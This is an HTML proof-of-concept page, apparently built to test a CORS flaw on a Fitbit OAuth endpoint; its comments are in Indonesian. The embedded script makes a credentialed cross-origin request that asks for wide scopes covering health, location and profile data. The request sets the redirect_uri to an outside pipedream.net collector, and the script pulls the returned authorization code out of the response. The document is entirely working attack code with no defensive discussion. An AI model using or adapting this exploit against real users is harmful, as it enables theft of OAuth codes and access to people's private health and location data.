<!DOCTYPE html>
<html>
<head>
  <title>Fitbit CORS PoC</title>
</head>
<body>
  <h1>Fitbit CORS PoC</h1>
  <p>Cek konsol browser (DevTools) untuk melihat apakah OAuth code berhasil diambil.</p>
  <script>
    const url = 'https://strava.fitbit.com/auth/fitbit?response_type=code&client_id=23QPQJ&redirect_uri=https://eoqb3e0qi0vy2sc.m.pipedream.net&scope=activity heartrate location nutrition profile settings sleep social weight&expires_in=604800';

    fetch(url, {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
      headers: {
        'Origin': window.origin
      }
    })
    .then(res => res.text())
    .then(text => {
      console.log('✅ Response received!');
      console.log(text);
      const code = /code=([\w-]+)/.exec(text);
      if (code) {
        console.log('✅ OAuth Code ditemukan:', code[1]);
        alert('OAuth Code ditemukan: ' + code[1]);
      } else {
        console.warn('⚠️ OAuth Code tidak ditemukan di respons.');
      }
    })
    .catch(err => {
      console.error('❌ Fetch error:', err);
    });
  </script>
</body>
</html>

